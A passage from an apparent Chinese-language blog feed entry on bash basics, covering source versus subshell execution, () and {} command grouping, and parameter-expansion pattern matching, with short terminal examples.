class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">03:11:58 yiyu@afra shell → pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line"></span><br><span class="line">03:12:02 yiyu@afra shell → cat s.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">cd ..</span><br><span class="line">（目錄並沒有被切換）</span><br><span class="line">03:14:39 yiyu@afra shell → ./s.sh</span><br><span class="line">03:14:58 yiyu@afra shell → pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">（使用 . 指令）</span><br><span class="line">03:15:43 yiyu@afra shell → . s.sh</span><br><span class="line">03:15:58 yiyu@afra shell → pwd</span><br><span class="line">/Users/yiyu/dev/tmp/</span><br><span class="line">（目錄被切換了）</span><br><span class="line">03:16:54 yiyu@afra tmp → cd shell</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">（使用 source 指令）</span><br><span class="line">03:17:49 yiyu@afra shell → source s.sh</span><br><span class="line">03:17:58 yiyu@afra shell → pwd</span><br><span class="line">/Users/yiyu/dev/tmp/</span><br><span class="line">（目錄被切換了）</span><br></pre></td></tr></tbody></table></figure><h3 id="與-1"><a href="#與-1" class="headerlink" title="() 與 {}"></a>() 與 {}</h3><p>這兩種包裹指令的方式可以讓指令一個接著一個執行下去，差異在於前者是在子 shell 中執行，後者是在當前 shell 中執行。</p><ul><li>()：產生新的 Shell 環境來執行</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">03:27:54 yiyu@afra shell → pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">03:27:58 yiyu@afra shell → (cd ..)</span><br><span class="line">03:28:28 yiyu@afra shell → pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br></pre></td></tr></tbody></table></figure><ul><li>{}：使用當前環境執行。切記，指令前後必須要空格，最後一個指令後面必須要有分號</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">03:28:29 yiyu@afra shell → pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">03:29:23 yiyu@afra shell → { cd ..; pwd; }</span><br><span class="line">/Users/yiyu/dev/tmp</span><br></pre></td></tr></tbody></table></figure><h2 id="再論參數"><a href="#再論參數" class="headerlink" title="再論參數"></a>再論參數</h2><h3 id="字串格式"><a href="#字串格式" class="headerlink" title="字串格式"></a>字串格式</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">${#string}</span><br></pre></td></tr></tbody></table></figure><p>可以用來計算字串，非常實用</p><ul><li>$0 可以用來顯示當前的程式名稱，時常被用來顯示當前 Shell 為何</li></ul><h3 id="樣式配對結構"><a href="#樣式配對結構" class="headerlink" title="樣式配對結構"></a>樣式配對結構</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var=hel___lo~</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${var#*l}</span> <span class="comment"># 刪除左側最短配對 # ___lo~</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${var##*l}</span> <span class="comment"># 刪除左側最短長配對 # o~</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想要改為刪除右側，將 # 替換為 %</span></span><br><span class="line">path=/Users/yy/dev</span><br><span class="line">basename path <span class="comment"># Unix 的 basename 指令。輸出：dev</span></span><br><span class="line"><span class="comment"># 我們可以用樣式配對結構來改寫</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${path##*/}</span> <span class="comment"># 刪除從左邊配對至最後一個 / ，即可以達成 basename 指令之輸出</span></span><br></pre></td></tr></tbody></table></figure><h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>熟悉 Shell 的一些知識與概念之後，寫 script 時不但能用較為優雅的方式來撰寫，也能增加 script 的靈活度。對於現在 CI/CD 流行的時代，Shell 幾乎是不可或缺的技術之一。這篇文章除了提供自己在日後可以快速方便的查閱以外，也提供有使用過 Shell 但是一直沒有深入了解過的各位朋友們！</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="shell" scheme="https://blog.yiyu0x.org/tags/shell/"/>
    
  </entry>
  
</feed>
